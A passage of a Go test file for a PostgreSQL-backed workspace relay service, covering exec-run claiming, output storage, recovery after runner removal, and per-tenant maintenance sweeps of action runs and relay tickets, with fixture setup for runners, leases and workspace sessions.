		{name: "runner on a ready workspace stays", state: workspacesession.StateReady, runner: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			f := newRelayFixture(t)
			if current := f.record(t); current.State != test.state {
				if !workspacesession.Transition(current.State, test.state) {
					f.updateWorkspace(t, func(arg *postgres.WorkspaceUpdate) { arg.State = workspacesession.StateClosing })
				}
				f.updateWorkspace(t, func(arg *postgres.WorkspaceUpdate) { arg.State = test.state })
			}
			connection := &relayConnection{
				ID: hubapi.NewID("relayconn"), WorkspaceID: f.workspace, Runner: test.runner, Scope: f.service.authInput(hubscope.NativeScope{Organization: f.project.OrganizationID, Project: f.project.ID}),
				Out: make(chan relayOutbound, relayWriteQueue), Done: make(chan struct{}),
			}
			relay := f.service.workspaces.relay
			if test.runner {
				if _, err := relay.attachRunner(connection); err != nil {
					t.Fatal(err)
				}
			} else if err := relay.attachPerson(connection); err != nil {
				t.Fatal(err)
			}
			f.service.workspaces.closeIfEndedSinceUpgrade(t.Context(), connection)
			select {
			case item := <-connection.Out:
				if test.wantCode == "" {
					t.Fatalf("a connection to a %s workspace was sent %+v", test.state, item)
				}
				if item.Final != test.wantCode {
					t.Fatalf("closed with %q, want %q", item.Final, test.wantCode)
				}
			default:
				if test.wantCode != "" {
					t.Fatalf("a connection that joined a %s workspace was left open", test.state)
				}
			}
		})
	}
}

func TestWorkspaceRelayBeginExecRunRequiresTheServingRunner(t *testing.T) {
	t.Parallel()
	t.Run("PostgreSQL runtime owner preserves claim and output", func(t *testing.T) {
		fixture := newPostgresRelayRuntimeFixture(t, false)
		for _, v := range fixture.tenants {
			command, err := fixture.server.runDetailStore().StoreDetail(t.Context(), string(v.record.OrganizationID), []byte("printf example"))
			if err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				owner := writer.(postgres.RelayActionWriter)
				if err := owner.CreateProjectAction(t.Context(), actionstore.Record{Action: workspacesession.Action{ID: "action_relay", OrganizationID: string(v.record.OrganizationID), ProjectID: string(v.record.ProjectID), Name: "Example", CreatedBy: "fixture", Revision: 1, CreatedAt: fixture.service.now(), UpdatedAt: fixture.service.now()}, Command: command}); err != nil {
					return err
				}
				_, err := owner.CreateActionRun(t.Context(), postgres.CreateActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_relay", ActionID: "action_relay", WorkspaceID: v.record.ID, CreatedBy: "fixture", CreatedAt: fixture.service.now()})
				return err
			}); err != nil {
				t.Fatal(err)
			}
			person := &relayConnection{ID: "relayconn_" + string(v.record.OrganizationID), WorkspaceID: v.record.ID, Out: make(chan relayOutbound, relayWriteQueue), Done: make(chan struct{})}
			stream := &relayStream{ID: person.ID + ":1", Channel: workspacesession.ChannelExec, ConnectionID: person.ID}
			if _, err := fixture.service.relay.attachRunner(v.runner); err != nil {
				t.Fatal(err)
			}
			if err := fixture.service.relay.attachPerson(person); err != nil {
				t.Fatal(err)
			}
			fixture.service.relay.Room(v.record.ID).Streams[stream.ID] = stream
			frame := execRunFrame("actionrun_relay", workspacesession.Action{ID: "action_relay", Command: "printf example"})
			capture := new(runtimeHistoryTraceCapture)
			ctx := context.WithValue(t.Context(), runtimeHistoryTraceKey{}, capture)
			if code := fixture.service.startExecRun(ctx, person, v.runner, v.record, stream, frame); code != "" {
				t.Fatalf("start refusal=%s", code)
			}
			capture.mu.Lock()
			queries := slices.Clone(capture.statements)
			capture.mu.Unlock()
			_, data := runtimeCapacityStatements(queries)
			if len(data) != 11 || len(queries) != 17 {
				t.Fatalf("runtime claim owner statements=%d full statements=%d want11/17", len(data), len(queries))
			}
			if code := fixture.service.startExecRun(t.Context(), person, v.runner, v.record, stream, frame); code != workspacesession.CodeAlreadyRunning {
				t.Fatalf("duplicate refusal=%s", code)
			}
			fixture.service.recordExecFrame(t.Context(), v.runner, stream, execOutputFrame(stream.ID, workspacesession.ExecOutput{Data: "example output"}))
			fixture.service.recordExecFrame(t.Context(), v.runner, stream, execExitedFrame(stream.ID, 0))
			var row postgres.ActionRun
			if err := fixture.server.accessRead(t.Context(), v.record.OrganizationID, func(reader tenantstore.Reader) error {
				var err error
				row, err = reader.(postgres.RelayActionReader).ActionRun(t.Context(), postgres.ActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_relay"})
				return err
			}); err != nil {
				t.Fatal(err)
			}
			if row.Status != "succeeded" || row.ClaimedBy != stream.ID || row.Revision != 3 || row.OutputSequence != 1 || row.OutputObjectKey == nil || row.OutputContentBytes != int64(len("example output")) {
				t.Fatalf("real runtime receipt=%+v", row)
			}
			ref := attachment.ArchiveReference{Key: *row.OutputObjectKey, SHA256: row.OutputSha256, CompressedSize: row.OutputBytes, UncompressedSize: row.OutputContentBytes, Codec: "gzip", SchemaVersion: 1, Kind: "archive", Retention: attachment.ArchiveRetention}
			stored, err := readChangeContent(fixture.server.contentContext(t.Context()), string(v.record.OrganizationID), ref)
			if err != nil || string(stored) != "example output" {
				t.Fatalf("stored runtime output=%q error=%v", stored, err)
			}
			fixture.service.recordExecFrame(t.Context(), v.runner, stream, execExitedFrame(stream.ID, 7))
			if err := fixture.server.accessRead(t.Context(), v.record.OrganizationID, func(reader tenantstore.Reader) error {
				got, err := reader.(postgres.RelayActionReader).ActionRun(t.Context(), postgres.ActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_relay"})
				if err == nil && !reflect.DeepEqual(got, row) {
					t.Fatalf("late exit overwrote first terminal response: got=%+v want=%+v", got, row)
				}
				return err
			}); err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessRead(t.Context(), v.record.OrganizationID, func(reader tenantstore.Reader) error {
				object, err := reader.ArchiveObjectByReference(t.Context(), ref)
				if err != nil {
					return err
				}
				var count int
				if err := fixture.admin.QueryRowContext(t.Context(), `SELECT count(*) FROM archive_object_owners WHERE organization_id=$1 AND archive_id=$2 AND owner_kind='project-action-run-output' AND owner_id=$3`, v.record.OrganizationID, object.ID, actionstore.ArchiveOwnerID(v.record.ProjectID, row.ID)).Scan(&count); err != nil {
					return err
				}
				if count != 1 {
					t.Fatalf("runtime output owner count=%d want1", count)
				}
				return nil
			}); err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				_, err := writer.(postgres.RelayActionWriter).CreateActionRun(t.Context(), postgres.CreateActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_recovery_exit", ActionID: "action_relay", WorkspaceID: v.record.ID, CreatedBy: "fixture", CreatedAt: fixture.service.now()})
				return err
			}); err != nil {
				t.Fatal(err)
			}
			recoveryStream := &relayStream{ID: person.ID + ":3", Channel: workspacesession.ChannelExec, ConnectionID: person.ID}
			fixture.service.relay.Room(v.record.ID).Streams[recoveryStream.ID] = recoveryStream
			if code := fixture.service.startExecRun(t.Context(), person, v.runner, v.record, recoveryStream, execRunFrame("actionrun_recovery_exit", workspacesession.Action{ID: "action_relay", Command: "printf example"})); code != "" {
				t.Fatalf("recovery-exit setup refusal=%s", code)
			}
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				owner := writer.(postgres.WorkspaceWriter)
				row, err := owner.WorkspaceSession(t.Context(), v.record.ProjectID, v.record.ID)
				if err != nil {
					return err
				}
				_, err = owner.UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: row.OrganizationID, ProjectID: row.ProjectID, ID: row.ID, ExpectedRevision: row.Revision, ExpectedRunnerID: row.RunnerID, ExpectedLeaseID: row.LeaseID, ExpectedFencingToken: row.FencingToken, State: workspacesession.StateRequested, Reason: workspacesession.ReasonHubRestarted, UpdatedAt: fixture.service.now()})
				return err
			}); err != nil {
				t.Fatal(err)
			}
			fixture.service.recordExecFrame(t.Context(), v.runner, recoveryStream, execOutputFrame(recoveryStream.ID, workspacesession.ExecOutput{Data: "retained during recovery"}))
			fixture.service.recordExecFrame(t.Context(), v.runner, recoveryStream, execExitedFrame(recoveryStream.ID, 17))
			if err := fixture.server.accessRead(t.Context(), v.record.OrganizationID, func(reader tenantstore.Reader) error {
				got, err := reader.(postgres.RelayActionReader).ActionRun(t.Context(), postgres.ActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_recovery_exit"})
				if err == nil && (got.Status != "failed" || !got.ExitCode.Valid || got.ExitCode.Int32 != 17 || got.Reason != "" || got.LeaseID != v.lease.LeaseID || got.OutputContentBytes != int64(len("retained during recovery"))) {
					t.Fatalf("cleared workspace binding lost actual exit facts=%+v", got)
				}
				return err
			}); err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				owner := writer.(postgres.WorkspaceWriter)
				for _, state := range []string{workspacesession.StateStarting, workspacesession.StateReady} {
					row, err := owner.WorkspaceSession(t.Context(), v.record.ProjectID, v.record.ID)
					if err != nil {
						return err
					}
					if _, err := owner.UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: row.OrganizationID, ProjectID: row.ProjectID, ID: row.ID, ExpectedRevision: row.Revision, ExpectedRunnerID: row.RunnerID, ExpectedLeaseID: row.LeaseID, ExpectedFencingToken: row.FencingToken, State: state, RunnerID: v.record.RunnerID, MachineID: string(v.record.MachineID), LeaseID: string(v.record.LeaseID), FencingToken: int64(v.record.FencingToken), Capabilities: []string{"files", "exec"}, UpdatedAt: fixture.service.now()}); err != nil {
						return err
					}
				}
				return nil
			}); err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				_, err := writer.(postgres.RelayActionWriter).CreateActionRun(t.Context(), postgres.CreateActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_removed", ActionID: "action_relay", WorkspaceID: v.record.ID, CreatedBy: "fixture", CreatedAt: fixture.service.now()})
				return err
			}); err != nil {
				t.Fatal(err)
			}
			removedStream := &relayStream{ID: person.ID + ":2", Channel: workspacesession.ChannelExec, ConnectionID: person.ID}
			fixture.service.relay.Room(v.record.ID).Streams[removedStream.ID] = removedStream
			if code := fixture.service.startExecRun(t.Context(), person, v.runner, v.record, removedStream, execRunFrame("actionrun_removed", workspacesession.Action{ID: "action_relay", Command: "printf example"})); code != "" {
				t.Fatalf("removed-run setup refusal=%s", code)
			}
			fixture.service.recordExecFrame(t.Context(), v.runner, removedStream, execOutputFrame(removedStream.ID, workspacesession.ExecOutput{Data: "retained after removal"}))
			if err := fixture.server.accessWrite(t.Context(), v.record.OrganizationID, func(writer tenantstore.Writer) error {
				return writer.RemoveRunnerIdentity(t.Context(), v.record.RunnerID, fixture.service.now())
			}); err != nil {
				t.Fatal(err)
			}
			fixture.service.recordExecFrame(t.Context(), v.runner, removedStream, execExitedFrame(removedStream.ID, 0))
			if err := fixture.server.accessRead(t.Context(), v.record.OrganizationID, func(reader tenantstore.Reader) error {
				got, err := reader.(postgres.RelayActionReader).ActionRun(t.Context(), postgres.ActionRunInput{OrganizationID: v.record.OrganizationID, ProjectID: v.record.ProjectID, ID: "actionrun_removed"})
				if err == nil && (got.Status != "failed" || got.Reason != "stream_closed" || got.ExitCode.Valid || got.OutputContentBytes != int64(len("retained after removal"))) {
					t.Fatalf("removed runner lost failure/output=%+v", got)
				}
				return err
			}); err != nil {
				t.Fatal(err)
			}

		}
	})

	t.Run("configured tenants maintain only their bounded relay work", func(t *testing.T) {
		fixture := newPostgresRelayRuntimeFixture(t, true)
		repository := fixture.server.config.TenantRepository.(*postgres.Repository)
		hosted := *fixture.server.config.Hosted
		hosted.OrganizationID = "org_first_second"
		hosted.WorkOSOrganizationID = "provider_org_first_second"
		hosted.BootstrapSubject = "user_org_first_second"
		second := openPostgresHubTestService(t, repository, Config{Hosted: &hosted, SecretKeys: fixture.server.config.SecretKeys, RunDetails: fixture.server.config.RunDetails, now: fixture.server.config.now})
		secondService := newWorkspaceService(second, WorkspaceConfig{Enabled: true})
		t.Cleanup(func() { secondService.relay.stop(t.Context()) })
		services := []*workspaceService{fixture.service, secondService}
		for index, value := range fixture.tenants {
			if services[index].server.appOrganizationID() != string(value.record.OrganizationID) {
				t.Fatalf("configured maintenance organization=%s want=%s", services[index].server.appOrganizationID(), value.record.OrganizationID)
			}
			command, err := fixture.server.runDetailStore().StoreDetail(t.Context(), string(value.record.OrganizationID), []byte("printf maintenance"))
			if err != nil {
				t.Fatal(err)
			}
			if err := fixture.server.accessWrite(t.Context(), value.record.OrganizationID, func(writer tenantstore.Writer) error {
				owner := writer.(postgres.RelayActionWriter)
				now := fixture.service.now()
				if err := owner.CreateProjectAction(t.Context(), actionstore.Record{Action: workspacesession.Action{ID: "action_maintenance", OrganizationID: string(value.record.OrganizationID), ProjectID: string(value.record.ProjectID), Name: "Example maintenance", CreatedBy: "fixture", Revision: 1, CreatedAt: now, UpdatedAt: now}, Command: command}); err != nil {
					return err
				}
				for number := range actionRunDispatchBatch + 1 {
					if _, err := owner.CreateActionRun(t.Context(), postgres.CreateActionRunInput{OrganizationID: value.record.OrganizationID, ProjectID: value.record.ProjectID, ID: fmt.Sprintf("actionrun_%03d", number), ActionID: "action_maintenance", WorkspaceID: value.record.ID, CreatedBy: "fixture", CreatedAt: now.Add(-2 * actionRunDispatchGrace)}); err != nil {
						return err
					}
				}
				for number := range hubmaintenance.ItemLimit + 1 {
					if _, err := owner.CreateRelayTicket(t.Context(), postgres.CreateRelayTicketInput{OrganizationID: value.record.OrganizationID, ProjectID: value.record.ProjectID, Digest: fmt.Sprintf("ticket_%03d", number), WorkspaceID: value.record.ID, SessionID: "session_example", PrincipalID: value.workerScope.Credential.ID, Subject: "example-subject", CreatedAt: now.Add(-time.Minute), ExpiresAt: now.Add(-30 * time.Second)}); err != nil {
						return err
					}
				}
				return nil
			}); err != nil {
				t.Fatal(err)
			}
			if _, err := services[index].relay.attachRunner(value.runner); err != nil {
				t.Fatal(err)
			}
		}
		assertCounts := func(tenant int, queued, running, failed, tickets int) {
			t.Helper()
			value := fixture.tenants[tenant]
			if err := fixture.server.accessRead(t.Context(), value.record.OrganizationID, func(reader tenantstore.Reader) error {
				owner := reader.(postgres.RelayActionReader)
				rows, err := owner.RecentActionRuns(t.Context(), value.record.ProjectID, "action_maintenance", nil, actionRunDispatchBatch+1)
				if err != nil {
					return err
				}
				counts := map[string]int{}
				for _, row := range rows {
					counts[row.Status]++
					if row.Status == "failed" && (row.Reason != workspacesession.RunReasonWorkspaceEnd || row.FinishedAt == nil) {
						t.Fatalf("maintenance lost terminal receipt: %+v", row)
					}
				}
				if len(rows) != actionRunDispatchBatch+1 || counts["queued"] != queued || counts["running"] != running || counts["failed"] != failed {
					t.Fatalf("%s run statuses=%v want queued/running/failed=%d/%d/%d", value.record.OrganizationID, counts, queued, running, failed)
				}
				page, err := owner.RelayTicketPage(t.Context(), "", hubmaintenance.ItemLimit)
				if err != nil {
					return err
				}
				if len(page) != min(tickets, hubmaintenance.ItemLimit) {
					t.Fatalf("%s ticket page count=%d want%d", value.record.OrganizationID, len(page), min(tickets, hubmaintenance.ItemLimit))
				}
				var count int
				if err := fixture.admin.QueryRowContext(t.Context(), "SELECT count(*) FROM workspace_relay_tickets WHERE organization_id=$1 AND project_id=$2", value.record.OrganizationID, value.record.ProjectID).Scan(&count); err != nil {
					return err
				}
				if count != tickets {
					t.Fatalf("%s ticket total=%d want%d", value.record.OrganizationID, count, tickets)
				}
				return nil
			}); err != nil {
				t.Fatal(err)
			}
		}
		for index, service := range services {
			service.dispatchQueuedActionRuns(t.Context())
			if err := service.sweepRelayTickets(t.Context(), service.now()); err != nil {
				t.Fatal(err)
			}
			for tenant := range services {
				if tenant <= index {
					assertCounts(tenant, 1, actionRunDispatchBatch, 0, 1)
				} else {
					assertCounts(tenant, actionRunDispatchBatch+1, 0, 0, hubmaintenance.ItemLimit+1)
				}
			}
		}
		for index, value := range fixture.tenants {
			if err := fixture.server.accessWrite(t.Context(), value.record.OrganizationID, func(writer tenantstore.Writer) error {
				owner := writer.(postgres.WorkspaceWriter)
				row, err := owner.WorkspaceSession(t.Context(), value.record.ProjectID, value.record.ID)
				if err != nil {
					return err
				}
				for _, state := range []string{workspacesession.StateClosing, workspacesession.StateClosed} {
					row, err = owner.UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: row.OrganizationID, ProjectID: row.ProjectID, ID: row.ID, ExpectedRevision: row.Revision, ExpectedRunnerID: row.RunnerID, ExpectedLeaseID: row.LeaseID, ExpectedFencingToken: row.FencingToken, State: state, Reason: "closed", RunnerID: row.RunnerID, MachineID: row.MachineID, LeaseID: row.LeaseID, FencingToken: row.FencingToken, UpdatedAt: services[index].now()})
					if err != nil {
						return err
					}
				}
				return nil
			}); err != nil {
				t.Fatal(err)
			}
			services[index].sweepActionRuns(t.Context())
			if err := services[index].sweepRelayTickets(t.Context(), services[index].now()); err != nil {
				t.Fatal(err)
			}
			for tenant := range services {
				if tenant <= index {
					assertCounts(tenant, 0, 0, actionRunDispatchBatch+1, 0)
				} else {
					assertCounts(tenant, 1, actionRunDispatchBatch, 0, 1)
				}
			}
		}
	})

}

type postgresRelayRuntimeTenant struct {
	fixture     nativeFixture
	workerScope hubscope.NativeScope
	record      workspaceRecord
	runner      *relayConnection
	lease       leasestore.Lease
}

type postgresRelayRuntimeFixture struct {
	server  *Service
	admin   *sql.DB
	service *workspaceService
	clock   *atomic.Int64
	tenants []postgresRelayRuntimeTenant
}

func newPostgresRelayRuntimeFixture(t *testing.T, hosted bool) postgresRelayRuntimeFixture {
	t.Helper()
	base := time.Now().UTC().Truncate(time.Microsecond)
	clock := new(atomic.Int64)
	clock.Store(base.UnixNano())
	cfg := Config{RunDetails: &memoryRunDetails{}, now: func() time.Time { return time.Unix(0, clock.Load()).UTC() }}
	if hosted {
		cfg.Hosted = &HostedConfig{OrganizationID: "org_first", WorkOSOrganizationID: "provider_org_first", BootstrapSubject: "user_org_first", PublicURL: "http://127.0.0.1:7777", Provider: newHostedSecurityProvider()}
	}
	server := newClockedPostgresNativeService(t, cfg)
	admin := usagePostgresAdmin(t, server)
	connection := startupConnection(t, admin, "detent_runtime_v2", "")
	config, err := connection.PoolConfig()
	if err != nil {
		t.Fatal(err)
	}
	pgtransport.Configure(config)
	config.MaxConns = 3
	if config.ConnConfig.Tracer == nil {
		config.ConnConfig.Tracer = runtimeHistoryTrace{}
	} else {
		config.ConnConfig.Tracer = multitracer.New(config.ConnConfig.Tracer, runtimeHistoryTrace{})
	}
	pool, err := pgxpool.NewWithConfig(t.Context(), config)
	if err != nil {
		t.Fatal(err)
	}
	repository, err := postgres.NewRepository(t.Context(), pool, postgres.PoolConfig{MaxConnections: 3, ServingConnections: 1, BackgroundConnections: 1})
	if err != nil {
		pool.Close()
		t.Fatal(err)
	}
	originalTenant, originalAccess, originalPostgres := server.config.TenantRepository, server.config.AccessRepository, server.database.postgres
	t.Cleanup(func() {
		server.config.TenantRepository, server.config.AccessRepository, server.database.postgres = originalTenant, originalAccess, originalPostgres
		if err := repository.Close(); err != nil {
			t.Error(err)
		}
	})
	server.config.TenantRepository, server.config.AccessRepository, server.database.postgres = repository, repository, repository
	service := newWorkspaceService(server, WorkspaceConfig{Enabled: true})
	originalWorkspace := server.workspaces
	server.workspaces = service
	t.Cleanup(func() { service.relay.stop(t.Context()); server.workspaces = originalWorkspace })
	result := postgresRelayRuntimeFixture{server: server, admin: admin, service: service, clock: clock}
	for index, organization := range []tracker.OrganizationID{"org_first", "org_first_second"} {
		if hosted {
			selectPostgresHubTestOrganization(server, organization)
		}
		f := newNativeFixture(t, server, organization, "Example relay")
		binding := runnerauth.NewBinding()
		runner, machine, worker := binding.RunnerID, string(binding.MachineID), "worker_relay"
		workerToken := "example-worker-" + string(organization)
		expires := base.Add(time.Hour)
		var session postgres.WorkspaceSession
		var lease leasestore.Lease
		if err := repository.WriteTenant(t.Context(), organization, corestore.Serving, func(w tenantstore.Writer) error {
			if err := w.CreateAccessCredential(t.Context(), accessstore.Credential{OrganizationID: organization, ID: worker, Name: "Example runner", Hash: apikey.HashToken(workerToken), Scope: "worker", NativeOnly: true, Kind: "service", ProjectAccess: "selected", CreatedAt: base, UpdatedAt: base, ExpiresAt: &expires}); err != nil {
				return err
			}
			if err := w.SetAccessTokenGrant(t.Context(), accessstore.TokenGrant{OrganizationID: organization, TokenID: worker, ProjectID: f.project.ID}); err != nil {
				return err
			}
			if err := w.CreateRunnerEnrollment(t.Context(), runnerstore.Enrollment{OrganizationID: organization, ID: "enrollment_relay", RunnerID: runner, MachineID: tracker.MachineID(machine), TokenHash: apikey.HashToken("enrollment-" + string(organization)), Scope: "projects", ProjectIDs: []tracker.ProjectID{f.project.ID}, Operations: []string{runnerauth.Read, runnerauth.Claim}, CreatedAt: base, ExpiresAt: expires, CreatedBy: "fixture"}); err != nil {
				return err
			}
			if err := w.RedeemRunnerEnrollment(t.Context(), "enrollment_relay", runner, tracker.MachineID(machine), base); err != nil {
				return err
			}
			if err := w.RegisterMachine(t.Context(), leasestore.Machine{OrganizationID: organization, ID: machine, Hostname: "example-host", Capacity: 2}); err != nil {
				return err
			}
			if err := w.CreateRunnerIdentity(t.Context(), runnerstore.Identity{OrganizationID: organization, RunnerID: runner, MachineID: tracker.MachineID(machine), TokenID: worker, EnrollmentID: "enrollment_relay", Scope: "projects", State: "active", Revision: 1, Operations: []string{runnerauth.Read, runnerauth.Claim}, CapacityLimit: 2, ReportedCapacity: 2, ProjectIDs: []tracker.ProjectID{f.project.ID}, CreatedAt: base, ExpiresAt: expires, LastHeartbeatAt: base}); err != nil {
				return err
			}
			if _, err := w.CreateWorkItem(t.Context(), corestore.WorkItem{OrganizationID: organization, ProjectID: f.project.ID, NativeID: "wi_relay_subject", Number: 1, Title: "Example subject"}); err != nil {
				return err
			}
			item, err := w.CreateWorkItem(t.Context(), corestore.WorkItem{OrganizationID: organization, ProjectID: f.project.ID, NativeID: "wi_relay_dispatch", Number: 2, Title: "Example workspace item"})
			if err != nil {
				return err
			}
			owner := w.(postgres.WorkspaceWriter)
			session, err = owner.CreateWorkspaceSession(t.Context(), postgres.WorkspaceCreate{OrganizationID: organization, ProjectID: f.project.ID, ID: fmt.Sprintf("ws_%032x", index+1), SubjectWorkItemID: "wi_relay_subject", Ref: "refs/heads/example", Requires: []string{"files", "exec"}, IdleTimeoutSeconds: 300, ExpiresAt: expires, RequestedExpiresAt: expires, CreatedBy: "fixture", CreatedAt: base})
			if err != nil {
				return err
			}
			if err := owner.PutWorkspaceItem(t.Context(), claimstore.WorkspaceItem{OrganizationID: organization, ProjectID: f.project.ID, WorkItemID: item.NativeID, WorkspaceID: session.ID, CreatedAt: base}); err != nil {
				return err
			}
			lease, err = w.Claim(t.Context(), leasestore.Claim{IssueID: item.ID, ExpectedRevision: item.Revision, MachineID: machine, RunnerID: runner, SessionID: "session_relay", LeaseID: "lease_relay", TTL: time.Hour})
			if err != nil {
				return err
			}

			for _, state := range []string{"starting", "ready"} {
				session, err = owner.UpdateWorkspaceSession(t.Context(), postgres.WorkspaceUpdate{OrganizationID: organization, ProjectID: f.project.ID, ID: session.ID, ExpectedRevision: session.Revision, ExpectedRunnerID: session.RunnerID, ExpectedLeaseID: session.LeaseID, ExpectedFencingToken: session.FencingToken, State: state, RunnerID: runner, MachineID: machine, LeaseID: lease.LeaseID, FencingToken: lease.FencingToken, Capabilities: []string{"files", "exec"}, UpdatedAt: base})
				if err != nil {
					return err
				}
			}
			return nil
		}); err != nil {
			t.Fatal(err)
		}
		credential, _, err := server.authenticateTenantAPIHash(t.Context(), organization, apikey.HashToken(workerToken), "", "")
		if err != nil {
			t.Fatal(err)
		}
		scope := hubscope.NativeScope{Organization: organization, Project: f.project.ID, Credential: credential}
		record := relayWorkspaceRecord(session)
		connection := &relayConnection{ID: "relayrunner_" + string(organization), WorkspaceID: session.ID, Runner: true, Scope: server.authInput(scope), Owner: record.owner(), PrincipalID: worker, SessionID: lease.LeaseID, Out: make(chan relayOutbound, relayWriteQueue), Done: make(chan struct{})}
		result.tenants = append(result.tenants, postgresRelayRuntimeTenant{fixture: f, workerScope: scope, record: record, runner: connection, lease: lease})
	}
	if hosted {
		selectPostgresHubTestOrganization(server, "org_first")
	}
	return result
}

func (f *relayFixture) updateWorkspace(t *testing.T, change func(*postgres.WorkspaceUpdate)) {
	t.Helper()
	if err := f.service.accessWrite(t.Context(), f.project.OrganizationID, func(writer tenantstore.Writer) error {
		owner := writer.(postgres.WorkspaceWriter)
		row, err := owner.WorkspaceSession(t.Context(), f.project.ID, f.workspace)
		if err != nil {
			return err
		}
		arg := postgres.WorkspaceUpdate{OrganizationID: row.OrganizationID, ProjectID: row.ProjectID, ID: row.ID, ExpectedRevision: row.Revision, ExpectedRunnerID: row.RunnerID, ExpectedLeaseID: row.LeaseID, ExpectedFencingToken: row.FencingToken, State: row.State, Reason: row.Reason, RunnerID: row.RunnerID, MachineID: row.MachineID, LeaseID: row.LeaseID, FencingToken: row.FencingToken, HeadSHA: row.HeadSHA, Capabilities: row.Capabilities, Isolation: row.Isolation, Worktree: row.Worktree, MachineHostname: row.MachineHostname, WorktreePath: row.WorktreePath, ReadOnly: row.ReadOnly, OpenedAt: row.OpenedAt, LastActivityAt: row.LastActivityAt, LastHeartbeatAt: row.LastHeartbeatAt, RebindDeadline: row.RebindDeadline, UpdatedAt: f.at()}
		change(&arg)
		_, err = owner.UpdateWorkspaceSession(t.Context(), arg)
		return err
	}); err != nil {
		t.Fatal(err)
	}
}
